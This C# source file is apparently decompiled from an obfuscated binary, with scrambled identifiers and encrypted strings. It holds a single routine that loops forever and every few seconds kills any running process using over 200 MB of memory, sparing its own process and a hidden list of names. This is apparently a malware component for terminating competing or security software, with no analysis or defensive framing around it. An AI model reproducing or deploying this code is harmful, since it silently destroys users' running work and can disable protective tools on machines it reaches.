using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace orBiLhAbVg;

public static class duJHkcApTLZhAn
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void TVfhTZXyguZp()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107406874)) && !process.ProcessName.Contains(getString_0(107406865)) && !process.ProcessName.Contains(getString_0(107406824)) && !process.ProcessName.Contains(getString_0(107406815)) && !process.ProcessName.Contains(getString_0(107406834)) && !process.ProcessName.Contains(getString_0(107406789)) && !process.ProcessName.Contains(getString_0(107406808)) && !process.ProcessName.Contains(getString_0(107406763)) && !process.ProcessName.Contains(getString_0(107406750)) && !process.ProcessName.Contains(getString_0(107406769)) && !process.ProcessName.Contains(getString_0(107406204)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static duJHkcApTLZhAn()
	{
		Strings.CreateGetStringDelegate(typeof(duJHkcApTLZhAn));
	}
}
